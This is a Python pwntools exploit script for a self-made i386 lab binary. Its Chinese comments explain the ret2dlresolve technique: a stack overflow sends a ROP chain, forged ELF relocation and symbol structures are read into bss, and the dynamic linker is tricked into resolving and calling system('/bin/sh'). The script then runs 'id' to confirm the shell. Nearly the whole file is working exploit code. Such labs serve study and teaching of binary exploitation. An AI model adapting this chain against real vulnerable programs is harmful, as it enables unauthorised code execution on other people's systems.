#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""lab_ret2dlresolve_i386 —— 伪造 ELF 结构让动态链接器去解析 system（自造实验，L3）

靶子只导入了 read（有 .dynsym/.dynstr/.rel.plt/PLT0），没有 system、没有 /bin/sh，
NX 打开，所以既不能 ret2libc（没 system 可调、也没泄漏），也不能 ret2shellcode。

思路（pwntools 的 Ret2dlresolvePayload 负责生成伪造结构）：
  1) 栈溢出只写两段：read(0, dl.data_addr, len) + plt0(reloc_offset)
  2) read 把伪造的 .dynstr/.dynsym/.rel.plt 写进 bss
  3) ret 到 PLT0，动态链接器按伪造的 reloc 去 libc 里解析 "system" 并调用，
     参数 (/bin/sh) 由 ROP.ret2dlresolve 自动摆在栈上

为什么 i386 上可行、x86_64 + 新 glibc 上不行：
  _dl_fixup() 在 DT_VERSYM 存在时要做版本检查，用的是**真实** symtab 下标，
  而伪造符号必须放在 symtab 之后很远的位置 -> symidx 很大 -> versym[symidx]
  越界读。i386 小二进制里这个越界地址通常仍落在已映射的 .bss/.data 上（读到 0），
  所以能过；x86_64 上则容易直接打到未映射页 -> SIGSEGV（见 25 unexploitable 的负结果）。
"""

import os
import time

from pwn import *

context(os="linux", arch="i386", log_level="info")

os.chdir(os.path.dirname(os.path.abspath(__file__)))
BIN = "./chal"
LIBC_DIR = "./libc"
LD_SO = os.getenv("LD_SO", "")          # 显式指定 loader；留空则用 ELF 里的 ./libc/ld-2.24.so

elf = ELF(BIN, checksec=False)


def build() -> tuple[bytes, bytes]:
    rop = ROP(elf)
    dl = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
    rop.read(0, dl.data_addr)            # 第二段：把伪造结构读进 bss
    rop.ret2dlresolve(dl)                # plt0(reloc_offset) -> _dl_runtime_resolve -> system
    return rop.chain(), dl.payload


def start() -> tube:
    if LD_SO:
        return process([LD_SO, "--library-path", LIBC_DIR, BIN])
    return process(BIN)                  # 靠 RUNPATH=$ORIGIN/libc 找到 libc.so.6


def main():
    chain, payload = build()
    log.info(f"stage1 chain = {len(chain)} bytes, fake elf payload = {len(payload)} bytes")

    p = start()
    p.recvuntil(b"data: ")
    p.send(chain)
    time.sleep(0.3)
    p.send(payload)
    time.sleep(0.3)
    p.sendline(b"echo __PWNED__; id; exit")

    out = p.recvrepeat(3).decode("utf-8", "ignore")
    p.close()
    print(out)

    if "__PWNED__" in out and "uid=" in out:
        log.success("system(\"/bin/sh\") resolved by dynamic linker")
    else:
        log.failure("ret2dlresolve failed")


if __name__ == "__main__":
    main()
